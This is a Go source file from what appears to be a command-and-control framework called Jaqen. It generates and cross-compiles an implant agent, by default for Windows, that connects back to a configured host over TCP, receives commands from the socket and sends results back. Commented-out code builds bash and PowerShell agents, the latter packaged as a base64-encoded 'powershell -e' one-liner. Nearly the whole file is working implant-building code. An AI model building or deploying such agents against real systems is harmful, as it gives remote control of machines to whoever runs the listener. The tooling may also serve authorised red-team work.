package tcpListener

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"text/template"

	"github.com/c-sto/Jaqen/libJaqen/server"
	"github.com/gobuffalo/packr"
)

func (d JaqenTCPListener) genGolangAgent() []byte {
	//Thanks to moloch-- and the rosie project for figuring out how to do the generation stuff mostly good https://github.com/moloch--/rosie
	host, _ := d.GetOption("ip")
	port, _ := d.GetOption("port")
	checkinTime, _ := d.GetOption("checkintime")
	execTime, _ := d.GetOption("exectime")

	codeStruct := server.AgentCode{
		CmdExecTimeout: execTime,
		CheckinMaxTime: checkinTime,
		Imports: `*/
		"bufio"
		"net"
		"os"
		/*`,
		GlobalVars: `
		*/ //global
type tcpObjs struct {
	inChan chan string //data to send
	//outChan    chan tcpResponse //data received
	reader     *bufio.Reader
	writer     *bufio.Writer
	conn       net.Conn
	connection *agent
	id         string
	Running    bool
	commands   chan string
}

var tO tcpObjs

func getCommandFromSocket() {
	for {
		if !tO.Running {
			randyboi := rand.Intn(1000) //1 seconds variance
			time.Sleep(time.Duration(randyboi) * time.Millisecond)
			continue
		}
		text, _ := tO.reader.ReadString('\n')
		tO.commands <- text
	}
}

/*
`,
		Checkin: `*/
		//checkin
		//check if the tcp socket still connected
		if !tO.Running {
			// if not connected, try to connect again
			c, err := net.Dial("tcp", a.settings.Get("host")+":"+a.settings.Get("port"))
			if err == nil {

				tO.conn = c
				tO.reader = bufio.NewReader(tO.conn)
				tO.Running = true
			} else {
				os.Exit(1)
			}
		}
		/*`,
		Init: `*/ //init
		//set port and host
		tO = tcpObjs{
			Running:  false,
			inChan:   make(chan string),
			commands: make(chan string, 5),
			//outChan: make(chan string),
		}
		a.settings.Set("port", "` + port + `")
		a.settings.Set("host", "` + host + `")
		go getCommandFromSocket()
		/*`,
		GetCommand: `*/ //GetCommand
		select {
		case a.cmd = <-tO.commands:
			return true
		default:
			return false
		}
		/*`,
		ExecCommand: `*//*`,
		SendResponse: `*/	
		tO.conn.Write(b)
		/*`,
	}

	codeStruct.AVoid("")

	boxs, err := packr.NewBox("../../../").MustString("agent/agent.go")
	if err != nil {
		fmt.Println(err)
		return []byte("")
	}

	code, err := template.New("goagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return []byte("")
	}

	var buf bytes.Buffer

	err = code.Execute(&buf, codeStruct)

	if err != nil {
		fmt.Println(err)
	}

	binDir, err := ioutil.TempDir("", "jaqen-build")

	if err != nil {
		fmt.Println(err)
	}

	workingDir := path.Join(binDir, "agent.go")

	fmt.Println("working", workingDir)
	codeFile, err := os.Create(workingDir)
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("Generating code to: " + codeFile.Name())

	err = code.Execute(codeFile, codeStruct)

	if err != nil {
		fmt.Println(err)
	}

	cgo, err := d.GetOption("cgo")
	if err != nil {
		cgo = "0"
	}
	goos, err := d.GetOption("goos")
	if err != nil {
		goos = "windows"
	}
	goarch, err := d.GetOption("goarch")
	if err != nil {
		goos = "x64"
	}

	outfile, _ := d.GetOption("outfile")

	buildr := []string{"build"}
	if outfile != "" {
		buildr = append(buildr, "-o")
		buildr = append(buildr, outfile)
	}

	goroot := server.GetGoRoot()
	gopath := server.GetGoPath()

	err = server.GoCmd(server.GoConfig{
		CGO:    cgo,
		GOOS:   goos,
		GOARCH: goarch,
		GOROOT: goroot,
		GOPATH: gopath,
	},
		binDir,
		buildr,
	)

	if err != nil {
		fmt.Println(err)
		return []byte{}
	}

	return []byte{} //buf.Bytes()
}

/*
type powershellagent struct {
	Domain string
	Split  int
}

func (d JaqenTCPListener) genBashAgent() string {
	dom, _ := d.GetOption("domain")

	spl := 60

	st, e := d.GetOption("split")
	if e == nil {
		spl, e = strconv.Atoi(st)
		if e != nil {
			fmt.Println(e)
		}
	}

	cfg := powershellagent{
		Domain: dom,
		Split:  spl,
	}
	boxs, err := packr.NewBox("./").MustString("bashtcpagent.sh")

	if err != nil {
		fmt.Println(err)
		return ""
	}
	code, err := template.New("bashtcpagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	var buf bytes.Buffer

	err = code.Execute(&buf, cfg)
	if err != nil {
		fmt.Println(err)
	}
	return buf.String()
}

func (d JaqenTCPListener) genPowershellAgent() string {
	dom, _ := d.GetOption("domain")

	spl := 60

	st, e := d.GetOption("split")
	if e == nil {
		spl, e = strconv.Atoi(st)
		if e != nil {
			fmt.Println(e)
		}
	}

	cfg := powershellagent{
		Domain: dom,
		Split:  spl,
	}
	boxs, err := packr.NewBox("./").MustString("tcpagent.ps1")

	if err != nil {
		fmt.Println(err)
		return ""
	}
	code, err := template.New("tcpagent").Parse(boxs)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	var buf bytes.Buffer

	err = code.Execute(&buf, cfg)
	if err != nil {
		fmt.Println(err)
	}
	x, _ := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder().String(buf.String())
	return "powershell -e " + base64.StdEncoding.EncodeToString([]byte(x))
	//return x //buf.String()
}*/
